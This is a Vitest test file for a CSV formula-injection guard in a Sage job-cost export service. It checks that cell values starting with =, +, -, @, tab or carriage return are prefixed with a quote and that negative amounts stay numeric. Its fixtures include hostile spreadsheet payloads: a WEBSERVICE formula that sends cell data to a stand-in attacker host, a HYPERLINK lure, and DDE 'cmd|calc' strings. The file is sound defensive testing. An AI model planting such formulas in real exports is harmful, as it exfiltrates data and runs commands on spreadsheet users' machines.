import { describe, it, expect } from 'vitest'
import { toSageCSV, sanitizeCsvCell } from '../lib/services/sageExportService'

describe('Sage CSV formula-injection guard', () => {
  describe('sanitizeCsvCell', () => {
    it("prefixes a formula trigger with a single quote", () => {
      expect(sanitizeCsvCell('=WEBSERVICE("https://attacker/"&A2)')).toBe(
        "'=WEBSERVICE(\"https://attacker/\"&A2)"
      )
      expect(sanitizeCsvCell('=HYPERLINK("https://attacker/","Approve")')).toBe(
        "'=HYPERLINK(\"https://attacker/\",\"Approve\")"
      )
    })

    it('prefixes all OWASP CSV-injection triggers', () => {
      expect(sanitizeCsvCell('=1+1')).toBe("'=1+1")
      expect(sanitizeCsvCell('+cmd|calc')).toBe("'+cmd|calc")
      expect(sanitizeCsvCell('-2+3')).toBe("'-2+3")
      expect(sanitizeCsvCell('@SUM(A1:A10)')).toBe("'@SUM(A1:A10)")
      expect(sanitizeCsvCell('\t=A1')).toBe("'\t=A1")
      expect(sanitizeCsvCell('\r=A1')).toBe("'\r=A1")
    })

    it('passes legitimate text through unchanged', () => {
      expect(sanitizeCsvCell('John Smith')).toBe('John Smith')
      expect(sanitizeCsvCell('Remove debris')).toBe('Remove debris')
      expect(sanitizeCsvCell('Labor - John (Foreman)')).toBe('Labor - John (Foreman)')
      expect(sanitizeCsvCell('')).toBe('')
    })

    it('passes numbers and numeric strings through so negative amounts stay numbers', () => {
      expect(sanitizeCsvCell(42)).toBe(42)
      expect(sanitizeCsvCell(0)).toBe(0)
      expect(sanitizeCsvCell(-100.5)).toBe(-100.5)
      expect(sanitizeCsvCell('12.34')).toBe('12.34')
      expect(sanitizeCsvCell('0.00')).toBe('0.00')
      expect(sanitizeCsvCell('-100.00')).toBe('-100.00')
      expect(sanitizeCsvCell('-5')).toBe('-5')
      expect(sanitizeCsvCell('1e3')).toBe('1e3')
    })

    it('treats null and undefined as empty', () => {
      expect(sanitizeCsvCell(null)).toBe('')
      expect(sanitizeCsvCell(undefined)).toBe('')
    })

    it('does not touch triggers that are not at the start', () => {
      expect(sanitizeCsvCell('A=B')).toBe('A=B')
      expect(sanitizeCsvCell('cost+tax')).toBe('cost+tax')
      expect(sanitizeCsvCell('email@domain.com')).toBe('email@domain.com')
    })
  })

  describe('toSageCSV end-to-end', () => {
    it('neutralises a malicious COR title in the Description column', () => {
      // mirrors exportChangeOrderSummary row shape
      const rows = [
        {
          'Job Number': 'JOB-42',
          'Change Order Number': 'COR-001',
          'Description': '=WEBSERVICE("https://attacker/"&A2)',
          'Status': 'approved',
          'Original Amount': '500.00',
          'Revised Amount': '750.00'
        }
      ]
      const csv = toSageCSV(rows)
      expect(csv).toContain('"\'=WEBSERVICE(""https://attacker/""&A2)"')
      // raw formula never appears unescaped in a cell
      expect(csv).not.toMatch(/"=WEBSERVICE/)
    })

    it('neutralises a malicious worker name in the Vendor column', () => {
      // mirrors exportJobCostTransactions row shape
      const rows = [
        {
          'Job Number': 'JOB-42',
          'Cost Type': 2,
          'Category': '02-000',
          'Trans Date': '11/24/2026',
          'Description': 'Labor - =evil (General)',
          'Units': '8.00',
          'Unit Cost': '55.00',
          'Amount': '440.00',
          'Vendor': '=cmd|calc!A1',
          'Reference': 'TM-abcdef12'
        }
      ]
      const csv = toSageCSV(rows)
      expect(csv).toContain("\"'=cmd|calc!A1\"")
      // The Description cell starts with "Labor - " so no prefix is needed,
      // and the embedded formula is inert since Excel only evaluates when a
      // cell BEGINS with a trigger.
      expect(csv).toContain('"Labor - =evil (General)"')
    })

    it('neutralises malicious cost-code fields in the cost-code export', () => {
      // mirrors exportCostCodeStructure row shape
      const rows = [
        {
          'Cost Code': '=HYPERLINK("https://attacker/","Click")',
          'Description': '@SUM(1,2)',
          'Cost Type': 5,
          'Cost Type Name': '-weird',
          'Parent/Phase': '+injected'
        }
      ]
      const csv = toSageCSV(rows)
      expect(csv).toContain("\"'=HYPERLINK(")
      expect(csv).toContain("\"'@SUM(1,2)\"")
      expect(csv).toContain("\"'-weird\"")
      expect(csv).toContain("\"'+injected\"")
    })

    it('keeps negative amount strings as numbers, not text', () => {
      const rows = [
        {
          'Job Number': 'JOB-1',
          'Description': 'Credit COR',
          'Original Amount': '-500.00',
          'Revised Amount': '-250.00'
        }
      ]
      const csv = toSageCSV(rows)
      // Must NOT be prefixed - a leading quote would make Sage 300 parse
      // the cell as text and skip the credit.
      expect(csv).toContain('"-500.00"')
      expect(csv).toContain('"-250.00"')
      expect(csv).not.toContain("\"'-500.00\"")
      expect(csv).not.toContain("\"'-250.00\"")
    })

    it('still produces a valid header + newline-joined CSV', () => {
      const rows = [
        { 'Job Number': 'A', 'Description': 'ok' },
        { 'Job Number': 'B', 'Description': '=bad' }
      ]
      const csv = toSageCSV(rows)
      const lines = csv.split('\n')
      expect(lines).toHaveLength(3)
      expect(lines[0]).toBe('"Job Number","Description"')
      expect(lines[1]).toBe('"A","ok"')
      expect(lines[2]).toBe("\"B\",\"'=bad\"")
    })

    it('returns an empty string for no rows', () => {
      expect(toSageCSV([])).toBe('')
    })
  })
})
